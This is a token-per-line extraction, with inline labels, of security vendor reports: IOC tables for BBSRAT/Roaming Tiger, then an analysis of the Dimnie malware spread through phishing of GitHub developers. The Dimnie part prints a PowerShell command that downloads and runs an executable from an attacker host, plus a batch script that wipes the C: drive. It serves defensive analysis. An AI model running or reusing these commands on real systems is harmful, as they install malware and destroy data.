UTC

2014­12­26
17:17:00
UTC

HTTPS

HTTP

kop[.]gupdiic[.]com B_ip.cncsvr

panaba[.]empleoy­plan[.]com B_ip.cncsvr

peak[.]measurepeak[.]com B_ip.cncsvr

41A02CAF0A0D32FAD5418425F9973616 B_hash

CC83EA6EF4763F24193D56359590BB34127DD36E B_hash

SHA1

SHA256

7438ED5F0FBE4B26AFED2FE0E4E4531FC129A44D8EA416F12A77D0C0CD873520 B_hash

Compile
Time

Network
Protocol

Server(s
)

2015­08­25
09:33:57
UTC

HTTPS

herman[.]eergh[.]com B_ip.cncsvr

prdaio[.]unbrtel[.]com B_ip.cncsvr

loomon[.]gupdicc[.]com B_ip.cncsvr

HTTPS

2014­12­26
17:17:00
UTC

winwordupdate[.]dynu[.]com B_ip.cncsvr

AA59EE1E40D22BD22CEE19B8B6A17DF3 B_hash

963E0AD3EC717253A8E74F45D3C552107D6ECACA B_hash

SHA1

SHA256

6FAE5305907CE99F9AB51E720232EF5ACF1950826DB520A847BF8892DC9578DE B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

0BAF36CA2D3772FDFF989E2B7E762829D30DB132757340725BB50DEE3B51850C B_hash

Compile
Time

Network
Protocol

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

B934BF027EC3A9DFCAE9D836D68BAB75 B_hash

E9744516E621B233C44F5854C0DF63FFDD62FB81 B_hash

2014­12­26
17:17:00
UTC

HTTPS

9/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

2015­09­22
06:16:44
UTC

HTTP

www[.]testzake[.]com B_ip.cncsvr

2015­09­21
11:59:18
UTC

HTTP

www[.]testzake[.]com B_ip.cncsvr

winwordupdate[.]dynu[.]com B_ip.cncsvr

adobeflashupdate1[.]strangled[.]net B_ip.cncsvr

7533E65A16B4B3BA451A141F389D3A30 B_hash

CB46E6234DA0A9C859C1F71FFEB86100284A0142 B_hash

8CD233D3F226CB1BF6BF15ACA52E0E36 B_hash

B955CA4AA8F7181C2252C4699718F6FEFC0B9CE3 B_hash

0AA391DC6D9EBEC2F5D0EE6B4A4BA1FA B_hash

D238C157F87204D03C9005AF9A9CBC28C108E50A B_hash

4/3/2016

Server(s
)

SHA1

SHA256

D579255852720D794349AE2238F084C6393419AF38479F3D0E3D2A21C9EB8E18 B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

95F198ED29CF3F7D4DDD7CF688BFEC9E39D92B78C0A1FD2288E13A92459BDB35 B_hash

Compile
Time

Network
Protocol

Server(s
)

PowerSploit
Downloader

SHA1

SHA256

71DC584564B726ED2E6B1423785037BFB178184419F3C878E02C7DA8BA87C64D B_hash

Compile
Time

network
Protocol

Server(s
)

IOCs

Hashes

61a692e615e31b97b47a215479e6347fbd8e6e33d7c9d044766b4c1d1ae1b1fb B_hash

22592a32b1193587a707d8b20c04d966fe61b37f7def7613d9bb91ff2fe9b13b B_hash

2d81d65d09bf1b864d8964627e13515cee7deddfbd0dc70b1e67f123ab91421e B_hash

d579255852720d794349ae2238f084c6393419af38479f3d0e3d2a21c9eb8e18 B_hash

0fc52c74dd54a97459e964b340d694d8433a3229f61e1c305477f8c56c538f27 B_hash

567a5b54d6c153cdd2ddd2b084f1f66fc87587dd691cd2ba8e30d689328a673f B_hash

95f198ed29cf3f7d4ddd7cf688bfec9e39d92b78c0a1fd2288e13a92459bdb35 B_hash

6fae5305907ce99f9ab51e720232ef5acf1950826db520a847bf8892dc9578de B_hash

b1737f3a1c50cb39cd9938d5ec3b4a6a10b711f17e917886481c38967b93e259 B_hash

71dc584564b726ed2e6b1423785037bfb178184419f3c878e02c7da8ba87c64d B_hash

4ea23449786b655c495edf258293ac446f2216464b3d1bccb314ef4c61861101 B_hash

0baf36ca2d3772fdff989e2b7e762829d30db132757340725bb50dee3b51850c B_hash

012ec51657d8724338a76574a39db4849579050f02c0103d46d406079afa1e8b B_hash

e049bd90028a56b286f4b0b9062a8df2ab2ddf492764e3962f295e9ce33660e3 B_hash

5aa7db3344aa76211bbda3eaaccf1fc1b2e76df97ff9c30e7509701a389bd397 B_hash

77a2e26097285a794e42c9e813d14936d0e7a1dd3504205dd6b28a71626f8c3c B_hash

fc4b465ee8d2053e9e41fb0a6ae32843e4e23145845967a069e584f582279725 B_hash

44171afafca54129b89a0026006eca03d5307d79a301e4a8a712f796a3fdec6e B_hash

7438ed5f0fbe4b26afed2fe0e4e4531fc129a44d8ea416f12a77d0c0cd873520 B_hash

13d0bd83a023712b54c1dd391dfc1bc27b22d9df4fe3942e2967ec82d7c95640 B_hash

Domains

adobeflashupdate.dynu[.]com B_ip.cncsvr

adobeflashupdate1.strangled[.]net B_ip.cncsvr

cdaklle.housejjk[.]com B_ip.cncsvr

futuresgolda[.]com B_ip.cncsvr

herman.eergh[.]com B_ip.cncsvr

jowwln.cocolco[.]com B_ip.cncsvr

kop.gupdiic[.]com B_ip.cncsvr


loomon.gupdiicc[.]com B_ip.cncsvr

pagbine.ofhloe[.]com B_ip.cncsvr

panaba.empleoy­plan[.]com B_ip.cncsvr

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

transactiona[.]com B_url.cncsvr B_ip.cncsvr

financenewsru[.]net B_ip.cncsvr

2014­12­26
17:17:00
UTC

HTTPS
10/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

peak.measurepeak[.]com B_ip.cncsvr

prdaio.unbrtel[.]com B_ip.cncsvr

support.yandexmailru[.]kr B_ip.cncsvr

systemupdate5.dtdns[.]net B_ip.cncsvr

testzake[.]com B_ip.cncsvr

transactiona[.]com B_url.cncsvr

wap.gxqtc[.]com B_ip.cncsvr

wap.hbwla[.]com B_ip.cncsvr

wap.kylxt[.]com B_ip.cncsvr

windowsupdate.dyn[.]nu B_ip.cncsvr

winwordupdate.dynu[.]com B_ip.cncsvr

www.testzake[.]com B_ip.cncsvr

www.yunw[.]top B_ip.cncsvr

7
Pingbacks
&
Trackbacks

December
23
,
2015
5:04
PM

2015­12­23
每日安全咨询
|
Threat
Intelligence
Force

December
23
,
2015
10:13
PM

Hackers
are
targeting
Russian
organizations
for
espionageSecurity
Affairs

December
23
,
2015
10:28
PM

Roaming B_malware.infosteal
Tiger I
Hackers
targets
Russian
organizationsSecurity
Affairs

December
23
,
2015
10:35
PM

Fortifying
Networks
–
Hackers
are
targeting
Russian
organizations
for
espionage

December
24
,
2015
2:31
AM

Roaming B_malware.infosteal
Tiger I
Hackers
targets
Russian
organizations
for
espionage
|
OSINFO

December
24
,
2015
9:28
PM

Оборонно­промышленный
комплекс
России
атакует
троян
BBSRAT B_malware.drop
|
Around
Cyber

December
25
,
2015
7:23
AM

Roaming B_malware.infosteal
Tiger I
Hackers
targets
Russian
organizations
for
espionage
|
Tailor
Technology

Post
Your
Comment

Name
*

Email
*

Website

Post
Comment

Home

Government

Partners

Unit
42
Threat
Intelligence

Technical
Documentation

Advanced
Endpoint
Protection

Get
Updates

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

11/12

4/3/2016

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Sign
up
to
receive
the
latest
news
,
cyber
threat
intelligence
and
research
from
Unit
42
.

Business
Email

Submit

Subscribe
to
the
Research
Center
Blog

Select
a
Month

Categories
&
Archives

Select
a
Category

More
→

Recent
Posts

Palo
Alto
Networks
News
of
the
Week
–
April
2
posted
by
Anna
Lough
on
April
2
,
2016

Don't
Be
an
April
Fool
:
Inside
a
Common
Phone
Scam
posted
by
Robert
Falcone
on
April
1
,
2016

Channel
Scoop
–
April
1
,
2016
posted
by
Lang
Tibbils
on
April
1
,
2016

How
the
EITest
Campaign's
Path
to
Angler
EK
Evolved
Over
Time
posted
by
Brad
Duncan
on
March
31
,
2016

Top
5
Things
to
Know
Before
You
Go
to
Ignite
Conference
2016
posted
by
Catherine
Crandall
on
March
31
,
2016

More
→

About
Palo
Alto
Networks

Palo
Alto
Networks
is
the
network
security
company
.

Our
innovative
platform
allows
enterprises
,
service
providers
,
and
government
entities
to
secure
their
networks
and
safely
enable
the
increasingly
complex
and
rapidly
growing
number
of
applications
running
on
their
networks
.

The
core
of
Palo
Alto
Networks
'
platform
is
our
next­generation
firewall
,
which
delivers
application
,
user
,
and
content
visibility
and
control
integrated
within
the
firewall
through
its
proprietary
hardware
and
software
architecture
.

Palo
Alto
Networks
products
and
services
can
address
a
broad
range
of
network
security
requirements
,
from
the
datacenter
to
the
network
perimeter
,
as
well
as
the
distributed
enterprise
,
which
includes
branch
offices
and
a
growing
number
of
mobile
devices
.

FOLLOW
US

Facebook

Twitter

Linked
In

You
Tube

Learn
More

Firewalls

Malware

Intrusion
Prevention
System

Intrusion
Detection
System

Denial
of
Service
Attack

Security
Policy

Network
Security

Data
Center
1.866.320.4788

Privacy
Policy

Legal
Notices

Site
Index

Subscriptions

Copyright
©
2007­2013
Palo
Alto
Networks

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

12/12
Dimnie B_malware.drop
:
Hiding
in
Plain
Sight

researchcenter.paloaltonetworks.com/2017/03/unit42-dimnie-hiding-plain-sight/ B_url.normal

By
Brandon
Levene
,
Dominik
Reichel
and
Esmid

Idrizovic

A
note
to
readers
:
The
code
samples
included
within
this
blog
post
may
trigger
alerts
from
your
security
software
.

Please
note
that
this
3/28/2017
does
not
indicate
an
infection
or
an
attack;
rather
,
it
is
a
notification
that
the
code
could
be
malicious
if
it
were
live
.

Introduction

In
mid-January
of
2017
Unit
42
researchers
became
aware
of
reports
of
open-source
developers
receiving
malicious
emails
.

Multiple
owners
of
Github
repositories
received
phishing
emails
like
the
one
below
:

Hello
,

My
name
is
Adam
Buchbinder
,
I
saw
your
GitHub
repo
and
i'm
pretty
amazed
.

The
point
is
that
i
have
an
open
position
in
my
company
and
looks
like
you
are
a
good
fit
.

Please
take
a
look
into
attachment
to
find
details
about
company
and
job
.

Dont
hesitate
to
contact
me
directly
via
email
highlighted
in
the
document
below
.

Thanks
and
regards
,

Adam
.

Though
there
were
multiple
waves
of
messages
following
a
similar
tactic
,
each
one
carried
the
same
malicious
.doc
file
as
an
attachment
(
SHA256
:
6b9af3290723f081e090cd29113c8755696dca88f06d072dd75bf5560ca9408e B_hash
)
.

This
file
contained
embedded
macro
code
that
executed
a
commonly
observed
PowerShell
command
to
download
and
execute
a
file
.

Figure
1
.
The
attackers
used
a
common
technique
to
try
to
avoid
static
detection
by
introducing
characters
which
the
Windows
shell
will
ignore
but
static
engines
will
typically
see
as
part
of
the
string
.

A
more
readable
version
of
the
PowerShell
code
is
shown
below
:

1
cmd.exe
/c
'
powershell.exe
-executionpolicy
bypass
-noprofile
-windowstyle
hidden
(
new-object
system.net.webclient).downloadfile('hxxp://nicklovegrove.co[.]uk/wpcontent/margin2601_onechat_word.exe','%appdata%.exe');start-process
'
%appdata%.exe
'
'

On
initial
inspection
,
everything
appears
to
follow
the
same
formula
as
many
'
traditional
'
malware
campaigns
:
e-mail
lure
,
malicious
attachment
,
macro
,
PowerShell
downloader
,
and
finally
a
binary
payload
(
SHA256
:
3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22 B_hash
)
.

Examining
the
payload's
communications
caused
us
to
raise
our
eyebrows
.

Dimnie B_malware.drop
,
the
commonly
agreed
upon
name
for
the
binary
dropped
by
the
PowerShell
script
above
,
has
been
around
for
several
years
.

Palo
Alto
Networks
has
observed
samples
dating
back
to
early
2014
with
identical
command
and
control
mechanisms
.

The
malware
family
serves
as
a
downloader
and
has
a
modular
design
encompassing
various
information
stealing
functionalities
.

Each
module
is
injected
into
the
memory
of
core
Windows
processes
,
further
complicating
analysis
.

During
its
lifespan
,
it
appears
to
have
undergone
few
changes
and
its
stealthy
command
and
control
methods
combined
with
a
previously
Russian
focused
target
base
has
allowed
it
to
fly
under
the
radar
up
until
this
most
recent
campaign
.

1/35

Hidden
Requests

Let
us
dive
right
in
and
have
a
look
at
a
typical
HTTP
request
from
Dimnie B_malware.drop
to
its
command
and
control
infrastructure
.

Figure
2
.
Initial
HTTP
GET
request
from
the
compromised
client
and
the
server's
reply
.
The
HTTP
payload
is
truncated
in
this
image
.

Does
this
malware
use
a
(
now-defunct
)
Google
service
to
aid
its
initial
phone
home
?

Not
quite
.

Examining
the
HTTP
request
,
this
appears
to
be
an
HTTP
Proxy
request
,
as
described
by
RFC2616
:

The
absoluteURI
form
is
REQUIRED
when
the
request
is
being
made
to
a
proxy
.

The
proxy
is
requested
to
forward
the
request
or
service
it
from
a
valid
cache
,
and
return
the
response
.

Note
that
the
proxy
MAY
forward
the
request
on
to
another
proxy
or
directly
to
the
serverspecified
by
the
absoluteURI
.

In
order
to
avoid
request
loops
,
a
proxy
MUST
be
able
to
recognize
all
of
its
server
names
,
including
any
aliases
,
local
variations
,
and
the
numeric
IP
address
.

An
example
Request-Line
would
be:GET
http://www.w3.org/pub/WWW/TheProject.html B_url.normal
HTTP/1.1To
allow
for
transition
to
absoluteURIs
in
all
requests
in
future
versions
of
HTTP
,
all
HTTP/1.1
servers
MUST
accept
the
absoluteURI
form
in
requests
,
even
though
HTTP/1.1
clients
will
only
generate
them
in
requests
to
proxies
.

Dimnie B_malware.drop
uses
this
feature
to
create
a
supposedly
legit
HTTP
proxy
request
to
a
Google
service
.

However
,
the
Google
PageRank
service
(
toolbarqueries.google.com B_url.unknown
)
has
been
slowly
phased
out
since
2013
and
as
of
2016
is
no
longer
open
to
the
public
.

Therefore
,
the
absolute
URI
in
the
HTTP
request
is
for
a
non-existent
service
and
the
server
is
not
acting
as
a
proxy
.

This
seemingly
RFC
compliant
request
is
merely
camouflage
.

We
know
what
it
isn't
,
so
we
will
dive
deeper
to
figure
out
what
is
happening
underneath
the
camouflage
layer
.

Start
by
having
a
look
at
the
DNS
request
that
immediately
preceded
this
HTTP
GET
request
.

2/35

Figure
3
.
DNS
request
issued
prior
to
the
HTTP
request
above
.

It
looks
pretty
normal
,
but
we
can
see
an
authoritative
nameserver
returning
an
IP
address
,
176.9.81[.]4 B_ip.unknown
,
which
is
highlighted
in
the
image
below
.

Figure
4
.
Nameserver
responds
to
a
Type
A
query
with
a
valid
response
.

While
it
may
not
seem
so
at
first
glance
,
this
DNS
query
is
related
to
the
initial
GET
request
to
Google
.

Below
is
the
raw
hex
of
the
IP
header
of
the
HTTP
request
above
:

Figure
5
.
Raw
Hex
of
the
IP
Header
from
the
HTTP
GET
request
for
Dimnie's B_malware.drop
initial
phone
home
.

The
answer
(
176.9.81[.]4 B_ip.unknown
)
from
the
initial
DNS
request
for
onechat[.]pw
is
used
as
the
destination
IP
for
the
follow
up
HTTP
request
that
appears
to
connect
to
toolbarqueries.google.com B_url.unknown
.

Sending
the
request
to
an
entirely
different
server
is
not
complicated
to
achieve
,
but
how
many
analysts
would
simply
see
a
DNS
request
with
no
[apparent]
related
subsequent
traffic
?

That
is
precisely
what
Dimnie B_malware.drop
is
relying
upon
to
evade
detections
.

3/35

What
the
GET
?

Since
we
have
established
the
HTTP
GET
request
to
be
largely
falsified
for
camouflage
purposes
,
we
can
now
proceed
to
pick
apart
the
initial
outbound
HTTP
traffic
.

The
contents
of
the
HTTP
GET
parameter
are
reproduced
below
:

1
GET
http://toolbarqueries.google.com/search?sourceid=navclient-ff&features=Rank&client=navclient-autoff&ch=fYQAcgUGKQ04yy+39O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm&q=info:google.com B_url.normal

HTTP/1.1

This
GET
request
contains
a
single
piece
of
data
used
by
the
malware
:
the
contents
of
the
'
ch
'
parameter
which
is
base64
encoded
.

1
fYQAcgUGKQ04yy+39O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm

Decoding
the
'
ch
'
parameter
yields
us
a
AES
key
which
Dimnie B_malware.drop
uses
to
decrypt
payloads
.

The
attacker
uses
AES
256
in
ECB
mode
to
encrypt
payloads
which
are
push
to
a
compromised
host
and
decrypted
.

The
code
below
illustrates
,
in
Python
,
the
method
we
used
to
derive
this
key
.

>>>
import
binascii
>>>
import
base64

>>>
from
Crypto.Cipher
import
AES

>>>
a
=
'
fYQAcgUGKQ04yy+39O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm
'

>>>
b
=
base64.b64decode(a
)

>>>
decryptor
=
AES.new('\0
'
*32
,
AES.MODE_ECB
)

>>>
c
=
decryptor.decrypt(b
)

>>>
binascii.hexlify(c
)
'
cda59f1670cf48bf0000000011217350b14b3f2d4c6001006fb3b0fb00000000adf1de43000000000000000000000000
'

>>>
key
=
c[4:8]
+
(
'
\0
'
*
28
)

>>>
binascii.hexlify(key
)
'
70cf48bf00000000000000000000000000000000000000000000000000000000
'

Besides
the
HTTP
payload
,
which
is
an
AES
256
ECB
encrypted
PE
file
(
after
decrypting
,
SHA256
:
6173d2f1d7bdea5f6fe199d39bbefa575230c5a6c52b08925ff4693106518adf B_hash
)
,
the
server
reply
contains
only
one
other
HTTP
header
that
seems
to
be
used
by
the
malware;
the
Cookie
value
sent
back
from
the
C2
server
.

This
Cookie
is
a
48
byte
,
base64
encoded
,
AES
256
ECB
encrypted
series
of
UINT32
values
pertaining
to
the
payload
(
when
requested
)
or
outbound
data
(
HTTP
POSTs
,
see
next
section
)
as
can
be
seen
below
(
comments
appended
after
//
.
)

struct
DimnieInformation

UINT32
dwUnknown1;
//
0x00
:

UINT32
dwAesKey;
//
0x04
:
Final
AES
encryption
key
is
:
Key
+
(
28
*
'
\0
'
)

UINT32
dwUnknown3;
//
0x08
:
Not
used
for
encryption
.

UINT32
dwUnknown4;
//
0x0C
:

UINT32
dwUnknown5;
//
0x10
:
Can
be
subtracted
with
dwUnknown1
if
higher
than
0
but
unknown
use
.

UINT32
dwUnknown6;
//
0x14
:

UINT32
dwKey2;
//
0x18
:
Not
used
for
encryption
.

UINT32
dwFileSize;
//
0x1C
:
File
size
if
file
has
been
downloaded
.

UINT32
dwUnknown9
//
0x20
:
Can
be
subtracted
with
dwUnknown1
if
higher
than
0
but
unknown
use
.

UINT32
dwType;
//
0x24
:
Type
of
sent/received
data
.

UINT32
dwCRC;
//
0x28
:
CRC
of
the
received
data
.

UINT32
dwModuleID;
//
0x2C
:
Module
ID
of
the
downloaded
module

Here
is
a
list
of
possible
types
which
may
be
found
at
offset
0x24
:

Value

Description

4/35

0x00000000
Main
PE
module
received
.

0x00000001
16
byte
information
sent
to
C2
,
probably
PING/PONG
.

0x00000002
PE
Module
received
.

0x000003a4
Get
module
.

0x000003a6
Get
main
module
.

0x00002000
Running
process
.

0x00003000
PC
Information
(
Computer
name
,
language
,
network
card
,
...
)

0x00038000
Keylogger
data
0x00058000
Screenshots
in
PNG
.

0x00018000
Unknown
.

0x00098000
Unknown
.

0x00418000
Unknown
.

0x00118000
Unknown
.

0x00218000
Unknown
.

0x00818000
Unknown
.

0x02000000
Unknown
.

The
values
contain
a
preset
,
defined
size
for
the
payload
as
well
as
an
expected
CRC32
value
.

Effectively
,
the
Cookie
parameter
is
used
to
verify
the
payload's
integrity
during
the
module
downloader
portion
of
the
malware's
lifecycle
.

When
the
Cookie
value
is
included
in
later
C2
traffic
,
it
is
primarily
used
to
identify
the
type
of
data
being
sent
back
to
the
server
and
the
reporting
module
.

More
Camouflage

Data
exfiltration
by
the
associated
modules
is
performed
using
HTTP
POST
requests
to
another
Google
domain
,
gmail[.]com B_url.normal
.

However
,
just
like
the
module
downloader
portion
of
the
malware
,
these
HTTP
requests
are
hardcoded
to
be
sent
to
an
attacker
controlled
server
.

Again
,
Dimnie B_malware.drop
attempts
to
blend
in
by
looking
at
least
somewhat
legitimate
,
although
the
data
exfiltration
traffic
is
far
less
convincing
than
that
of
the
module
downloads
.

5/35

Figure
6
.
HTTP
POST
request
with
encrypted
data
.

Once
again
,
the
data
is
appended
to
an
image
header
and
encrypted
using
AES
256
in
ECB
mode
.

The
Cookie
value
follows
the
same
structure
provided
in
the
previous
section
.

This
initial
push
contains
system
information
as
can
be
seen
in
the
decrypted
output
below
(
data
enclosed
in
brackets
has
been
edited
)
:

[netbios
name]

WORKGROUP

HomeGroupUser$
[Hostname]
[Language]
10.0.2.15
(
08-00-27-D9-83-51
)
'
Intel(R
)
PRO/1000
MT-Desktopadapter
'

PCI\VEN_8086&DEV_100E&SUBSYS_001E8086&REV_02\3&267A616A&0&18

Administrator
(
0x10203
)
[Username]
(
0x10223
)

HomeGroupUser$
(
0x10201
)
[Hostname]
(
0x10221
)

During
our
analysis
,
we
identified
follow
on
POST
requests
containing
screenshots
of
the
compromised
desktop
and
process
activity
lists
which
were
encrypted
and
appended
to
a
false
JPEG
header
as
described
previously
.

6/35

Figure
7
.
Process
activity
list
,
post-decryption
.

Decoding
the
Traffic

Now
that
we
understand
how
Dimnie B_malware.drop
retrieves
its
modules
and
how
it
protects
them
,
we
can
use
the
derived
AES
key
to
decode
the
observed
payloads
from
our
PCAP
data
.

The
payloads
themselves
are
never
written
to
disk
as
they
are
downloaded
and
subsequently
injected
directly
into
memory
.

The
module
ID
is
stored
at
offset
0x2C
as
a
32
byte
value
in
the
Cookie
field
,
however
to
calculate
the
'
true
'
module
ID
we
must
use
the
following
formula
using
the
key
found
at
offset
0x04
in
the
cookie
:
uModuleID
=
uID
–
uKey
.

Below
is
a
table
of
observed
module
IDs
,
their
functions
,
and
type
of
information
as
referenced
by
the
Cookie
Header
(
at
offset
0x24
)
:

Module

Function

0x20001

Main
module
:
downloads
other
modules
and
injects
them
into
memory
.

0x20002

DLL
module
which
exports
SvcMain
and
is
injected
into
another
process
.

0x20003

Contains
58
bytes
in
front
of
the
DOS
header
.

Purpose
unknown
.
Appears
to
be
a
copy
of
the
main
module
.

0x20004

Extracts
PC
information
and
sends
it
back
to
C2
.

0x20005

Enumerates
running
processes
and
sends
the
list
back
to
the
C2
.

0x20006

Module
that
can
logkey
strokes
,
take
screenshots
,
interact
with
smartcards
and
more
.

Uses
RegisterRawInputDevices
/
GetRawInputData
for
logging
keys
.

Information
Value

0x03000

0x2000

0x38000
,
0x418000
,
0x818000
,
0x98000
,
0x118000
,
0x218000
,
0x58000

0x20007

Keylogger
module
which
has
two
PE
files
appended
.

Both
PE
files
contain
the
same
functionality
but
are
different
architecture
(
x86
and
x64
)
.

It
sends
back
the
logged
keys
and
clipboard
data
to
the
C2
0x38000
0x20008
Module
that
can
take
screenshots
and
send
them
back
to
the
C2
.

0x20009

Self-destruct
module
which
deletes
all
files
on
the
C:\
Drive
.

0x58000

0x02000000

The
self-destruct
module
,
0x20009
,
drops
and
executes
the
following
batch
script
:

7/35

@echo
off

Title
System
need
to
reboot
computer
!

color
0c

Echo
Auto
Starting
in
5
seconds

@ping
127.0.0.1
-n
5
-w
1000
>
nul

@ping
127.0.0.1
-n
%1%
-w
1000
>
nul

Color
0e

Echo
delete
disk
C
del
C:\\
/s
/q
@ping
127.0.0.1
-n
3
-w
1000
>
nul
@ping
127.0.0.1
-n
%1%
-w
1000
>
nul
color
0c

Echo
Remove
directory

Rd
C:\\
/s
/q
@ping
127.0.0.1
-n
3
-w
1000
>
nul
@ping
127.0.0.1
-n
%1%
-w
1000
>
nul

Msg
*
\SYSTEM
ERROR!HARDDRIVE
IS
OUT
OF
ORDER!\;

The
primary
purpose
of
the
modules
we've
observed
observed
is
information
stealing
and
reconnaissance
.

It
should
be
noted
that
Dimnie's B_malware.drop
modular
framework
allows
for
a
variety
of
capabilities
to
be
accessed
by
its
operators
,
thus
the
modules
observed
during
the
analyzed
campaign
may
not
encompass
all
available
functionality
.

Conclusion

The
global
reach
of
the
January
2017
campaign
which
we
analyzed
in
this
post
is
a
marked
departure
from
previous
Dimnie B_malware.drop
targeting
tactics
.

Multiple
factors
have
contributed
to
Dimnie's B_malware.drop
relatively
long-lived
existence
.

By
masking
upload
and
download
network
traffic
as
innocuous
user
activity
,
Dimnie B_malware.drop
has
taken
advantage
of
defenders
'
assumptions
about
what
normal
traffic
looks
like
.

This
blending
in
tactic
,
combined
with
a
prior
penchant
for
targeting
systems
used
by
Russian
speakers
,
likely
allowed
Dimnie B_malware.drop
to
remain
relatively
unknown
.

Customers
are
protected
by
IPS
,
Dimnie B_malware.drop
is
detected
as
malware
by
Wildfire
,
and
Autofocus
customers
can
see
related
samples
using
the
Dimnie B_malware.drop
tag
.

We
are
also
including
IOCs
for
this
malware
family
dating
back
to
2014
which
include
domains
from
DNS
lookups
(
Appendix
A
)
and
dropper
hashes
(
Appendix
B
)
.

IOCs
specifically
mentioned
in
this
post
are
included
in
the
next
section
.

IOCs
Mentioned
in
this
Report

We've
purposefully
omitted
legitimate
domains
and
IPs
from
this
listing
.

Initial
Phishing
Email
:
b70a17d21ec6552e884f01db47b4e0aa08776a6542883d144b9836d5c9912065

Malicious
.doc
file
:
6b9af3290723f081e090cd29113c8755696dca88f06d072dd75bf5560ca9408e
,

Dimnie B_malware.drop
loader
:
3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22
,

Sample
decrypted
main
module
:
6173d2f1d7bdea5f6fe199d39bbefa575230c5a6c52b08925ff4693106518adf

Appendix B_hash
A I

:
Associated
SHA256
Hashes

15895f99011f466f2ddfa8345478b2387762d98eecf2ada51ad7f70618406ba1 B_hash

7d8ec31d9d98802e9b1ebc49c4b300fa901934b3d2d602fa36cc5d7c5d24b3bc B_hash

046bc7347a66c977a89ba693307f881b0c3568314bb7ffd952c8705a2ff9bf9d B_hash

8/35

4b10cc374ed9e2c69231fcfa1b1d96496785ecf148f9445192f24385068e7b0c B_hash

1b5e57fa264b2ce145b39f9fc2279b21f6b212aeca8eaa27f68cdcdbdef1900f B_hash

e47ce23ec14114d3abeba090baa77b9bec876f947df67076dddb9087387735c7 B_hash

d99c699e399afcd9e5abcff8c9b4a40af3e428f0c452c646653c79ec1a623bba B_hash

b6dc94f75ea4d2b46cf41079b1ac4cf48fe7786019396f379822fe6e21c9929d B_hash

a4df4a25e847d95a86a257bef7d2b349e9908bec37f0199f9f217d9cc0e28564 B_hash

caba117fdf3ca61b1b17121adb4546e829df5426ab8944e5c4672f4a8619d0fe B_hash

3ffec5efb775c7d977f1e0ad1e8a51a111394e0ed113f58809fc8441b2c0f731 B_hash

3d94881f0125093576dd01cd54cfd937cdca2b3050ad9aa4c5db2514d9aa686c B_hash

1d06464bafd24c228fd66df9cbf8feceda1346cef8648c2cd87cf617547bbe1e B_hash

d0eaec396ae11110dc4f51f3340d4735790876510de438f8a161577c7aa72d1e B_hash

9c403782571042fe2e3efb3acc35a26867956235a2a9472798bd664b65698c3a B_hash

222beafedbb604d200099cee657505f1d11b371403c7c9c12103adf28a561289 B_hash

0f76bcda668095a8d2fe7a1282d463dcf04201e1c5a35856f117703bcd9428ef B_hash

c4bc691d7b8a16ff68ed338878451d1ba681aa181922cabd0b999b935ded673e B_hash

67a1dead18afc43c69a97de3e39bd84dec91df751a45bbda7ac5874f746c147c B_hash

7c4c2c898f611fd12a244822f5a2080da51126713d4ed1b3c950aa0ba6f92d93 B_hash

67df79166bb258e77959c326c21563ea41f3f119d8e8486043efb83c868e636f B_hash

5661e7c23ed6058157b39ed29fa37690148d377b1faa7c7b89024daf0ef7e904 B_hash

bbe7abc992928a45b618fbd7fbdd472ec3e4a47126f21ec38ad8257afe0c091f B_hash

05e30073cbd18b0ff2cfeab307e2e8cd2226d921a1872f17fcc312fc601fa93e B_hash

4a25bf18783ad32e08aaff0707d8fdae88647da4e0bfd22d83850e0dfa4ab148 B_hash

3109724914f0eec8ee5167b15e43fc71e58106983ad0d2137c96239d5b25ad7c B_hash

c333173687879f3a6387f5afd915d9a4f042ffeb96f4cdf4514a5433de558f6f B_hash

071d91e67c42811d96d15a4a6dff740cc5d704ca352d9bc03778a2a6abd552f4 B_hash

d884ae7b4f88973d2fb763b00c41171353310696e66dcde5733558ca68cd68d5 B_hash

3944c7586e17399051785e1ae0311f4b98e74825291249a784428a64a80240e5 B_hash

f76fe0b83e45a77ebc36ab12a27a5cf49be74fb154c51cb793e946c45bc4e12f B_hash

9f2367e31987327ef5710f7dcbfa089382c1967247c5ac1e2342e1e10e495fb5 B_hash

5f45450f3342fd4f7f08651d58f775d47a25a44758039a577811eed6c094dfa7 B_hash

824b93c4662cdc072488cf82d34569dd27d6f1fced5cb83f045825ed2e4b463c B_hash

9/35

ba6022401ed257f82b7107319a7ec928044acd3dcb60dfab1ac7df2823ffef25 B_hash

441b1db0595565ac059552790e96524851843b22787238291f286b16c9c951d4 B_hash

0a5c9818aa579082af224abc02dad60d77f4ded6533d143100b7744b58e289a2 B_hash

871cefc4f9faf8658804dbe8332e3b511172ea29545e13c303ae1809edf8a0f6 B_hash

bf3869e420ac8686b9ae3b14d679f45b34909ff998887f9fd0c8126853d6a4ed B_hash

c18775abf5c992cbd9b3b0c401fb0ee66bbe092e44b0b1b3cdd17fdc353d825e B_hash

8eef688751eed591bedd2fcc18d32bb84df11fdda62a16c963561aeeae56f6f4 B_hash

ea6a8a46b61e2a8813c4146461e4c961dfb2cbcf277d8bb9edfc14be73f9f073 B_hash

